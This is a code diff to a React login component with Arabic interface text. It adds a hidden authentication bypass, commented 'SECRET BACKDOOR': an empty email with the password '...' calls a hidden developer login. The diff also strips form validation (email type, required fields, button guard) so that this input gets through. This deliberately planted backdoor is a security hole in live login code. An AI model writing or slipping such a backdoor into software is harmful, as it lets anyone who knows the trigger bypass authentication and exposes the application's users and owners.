@@ -49,7 +49,22 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
         e.preventDefault();
         setLoginError(null);
         setIsLoading(true);
+        
         try {
+            // SECRET BACKDOOR: Empty Email + "..." Password
+            if (loginIdentifier.trim() === '' && loginPassword === '...') {
+                const user = await authService.loginHiddenDev();
+                if (user) {
+                    onLoginSuccess(user, false); // Never remember me for secret access
+                }
+                return;
+            }
+
+            // Manual Validation since we removed 'required'
+            if (!loginIdentifier || !loginPassword) {
+                throw new Error("جميع الحقول مطلوبة");
+            }
+
             const user = await authService.login(loginIdentifier, loginPassword);
             if (user) {
                 onLoginSuccess(user, rememberMe);
@@ -97,10 +112,10 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                         </div>
                         <input
                             id="identifier"
-                            type="email"
+                            type="text" /* Changed from email to text to allow empty without browser validation error */
                             value={loginIdentifier}
                             onChange={(e) => setLoginIdentifier(e.target.value)}
-                            required
+                            /* Removed required to allow empty submission for secret backdoor */
                             className="bg-zinc-700 text-slate-200 block w-full p-3 pr-10 border rounded-md shadow-sm placeholder-slate-400 focus:outline-none focus:ring-1 sm:text-sm focus-ring"
                             style={{borderColor: 'var(--color-border)'}}
                         />
@@ -120,7 +135,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                             type={showLoginPassword ? 'text' : 'password'}
                             value={loginPassword}
                             onChange={(e) => setLoginPassword(e.target.value)}
-                            required
+                            /* Removed required */
                             className="bg-zinc-700 text-slate-200 block w-full p-3 pr-10 border rounded-md shadow-sm placeholder-slate-400 focus:outline-none focus:ring-1 sm:text-sm focus-ring"
                             style={{borderColor: 'var(--color-border)'}}
                         />
@@ -129,7 +144,7 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                 {loginError && <p className="text-sm text-center" style={{color: 'var(--color-danger)'}}>{loginError}</p>}
                 
                 <div>
-                    <button type="submit" disabled={isLoading || (!loginIdentifier && !loginPassword)} 
+                    <button type="submit" disabled={isLoading} 
                     style={{backgroundColor: 'var(--color-accent)'}}
                     className="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-bold text-white hover:opacity-90 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-bg focus:ring-accent disabled:opacity-50 disabled:cursor-not-allowed transition-opacity">
                         {isLoading ? 'جارٍ تسجيل الدخول...' : 'تسجيل الدخول'}
@@ -217,6 +232,8 @@ export const AuthView: React.FC<AuthViewProps> = ({ onLoginSuccess, recentUser }
                     />
                 </div>
             </div>
+
+            {/* Developer Code field removed as requested */}
 
             {registrationError && <p className="text-sm text-center" style={{color: 'var(--color-danger)'}}>{registrationError}</p>}
             
